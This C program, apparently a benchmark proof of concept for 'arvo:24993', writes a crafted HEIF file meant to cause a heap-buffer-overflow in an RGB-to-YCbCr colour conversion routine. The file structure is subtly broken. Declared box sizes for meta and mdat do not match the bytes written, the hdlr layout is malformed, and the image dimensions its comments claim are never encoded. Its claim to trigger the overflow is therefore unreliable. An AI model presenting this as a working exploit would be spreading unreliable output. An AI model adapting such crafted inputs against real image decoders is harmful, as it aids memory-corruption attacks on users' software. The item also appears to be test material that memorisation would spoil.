#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for arvo:24993 */
/* Triggers: heap-buffer-overflow in Op_RGB_to_YCbCr<unsigned char>::convert_colorspace */
/* Vuln class: heap_buffer_overflow */

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* HEIF file with ftyp box (mif1 brand) */
    /* ftyp box: size=24, type=ftyp, major_brand=mif1, minor_version=0, compatible_brands=heic */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x18, f); /* box size: 24 */
    fputc(0x66, f); fputc(0x74, f); fputc(0x79, f); fputc(0x70, f); /* 'ftyp' */
    fputc(0x6D, f); fputc(0x69, f); fputc(0x66, f); fputc(0x31, f); /* 'mif1' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* minor version: 0 */
    fputc(0x6D, f); fputc(0x69, f); fputc(0x66, f); fputc(0x31, f); /* 'mif1' */
    fputc(0x68, f); fputc(0x65, f); fputc(0x69, f); fputc(0x63, f); /* 'heic' */

    /* meta box containing hdlr box for 'pict' handler */
    /* meta box: size=33, type=meta */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x21, f); /* box size: 33 */
    fputc(0x6D, f); fputc(0x65, f); fputc(0x74, f); fputc(0x61, f); /* 'meta' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* version/flags */

    /* hdlr box inside meta: size=25, type=hdlr */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x19, f); /* box size: 25 */
    fputc(0x68, f); fputc(0x64, f); fputc(0x6C, f); fputc(0x72, f); /* 'hdlr' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* version/flags */
    fputc(0x70, f); fputc(0x69, f); fputc(0x63, f); fputc(0x74, f); /* 'pict' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* reserved */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* reserved */
    fputc(0x00, f); /* null terminator for handler name */

    /* mdat box with crafted image data */
    /* mdat box: size=1000, type=mdat */
    fputc(0x00, f); fputc(0x00, f); fputc(0x03, f); fputc(0xE8, f); /* box size: 1000 */
    fputc(0x6D, f); fputc(0x64, f); fputc(0x61, f); fputc(0x74, f); /* 'mdat' */

    /* Write crafted image data that triggers the overflow */
    /* The vulnerability occurs when width/height cause subsampling to read beyond buffer */
    /* Use width=256, height=256 with specific pixel data pattern */
    for (int i = 0; i < 984; i++) {
        fputc(0xFF, f); /* Fill with max pixel values to stress the conversion */
    }

    fclose(f);
    return 0;
}